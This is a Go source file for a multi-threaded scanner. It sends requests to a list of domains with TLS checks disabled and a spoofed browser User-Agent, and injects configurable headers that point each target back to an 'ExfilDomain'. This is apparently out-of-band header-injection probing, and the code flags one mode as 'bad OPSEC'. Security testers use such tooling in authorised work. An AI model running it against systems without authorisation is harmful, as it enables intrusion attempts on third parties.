package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/schollz/progressbar/v3"
)

type ScannerConfig struct {
	Domains          []string
	ExfilDomain      string
	HeadersToInject  map[string]string
	Workers          int
	ShowOpsecWarning bool
}

type Scanner struct {
	config ScannerConfig
	client *http.Client
	bar    *progressbar.ProgressBar
}

func NewScanner(config ScannerConfig) *Scanner {
	transport := &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        config.Workers * 2,
		IdleConnTimeout:     90 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	description := fmt.Sprintf("[%s] Scanning domains...", yellow("*"))
	if config.ShowOpsecWarning {
		description = fmt.Sprintf("[%s] WARNING: Using all headers (bad OPSEC)", yellow("!"))
	}

	bar := progressbar.NewOptions(len(config.Domains),
				      progressbar.OptionSetDescription(description),
				      progressbar.OptionSetWriter(os.Stderr),
				      progressbar.OptionShowCount(),
				      progressbar.OptionShowIts(),
				      progressbar.OptionSpinnerType(14),
				      progressbar.OptionOnCompletion(func() {
					      fmt.Fprint(os.Stderr, "\n")
				      }),
	)

	return &Scanner{
		config: config,
		client: client,
		bar:    bar,
	}
}

func (s *Scanner) processDomain(domain string) {
	defer s.bar.Add(1)

	url := fmt.Sprintf("https://%s", domain)
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		PrintError("Error creating request for %s: %v", domain, err)
		return
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
	req.Close = true

	for header, format := range s.config.HeadersToInject {
		value := fmt.Sprintf(format, domain, s.config.ExfilDomain)
		req.Header.Set(header, value)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	_, _ = io.Copy(io.Discard, resp.Body)
}

func (s *Scanner) Run(ctx context.Context) {
	var wg sync.WaitGroup
	domainJobs := make(chan string, s.config.Workers)
	for i := 0; i < s.config.Workers; i++ {
		wg.Add(1)
		go s.worker(ctx, &wg, domainJobs)
	}
	for _, domain := range s.config.Domains {
		domainJobs <- domain
	}
	close(domainJobs)
	wg.Wait()
}

func (s *Scanner) worker(ctx context.Context, wg *sync.WaitGroup, domains <-chan string) {
	defer wg.Done()
	for domain := range domains {
		select {
			case <-ctx.Done():
				return
			default:
				s.processDomain(domain)
		}
	}
}

func readDomainsFromFile(filePath string) ([]string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return nil, fmt.Errorf("could not open domains file %q: %w", filePath, err)
	}
	defer file.Close()
	var domains []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			domains = append(domains, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error reading domains file: %w", err)
	}
	if len(domains) == 0 {
		return nil, fmt.Errorf("no domains found in %s", filePath)
	}
	return domains, nil
}
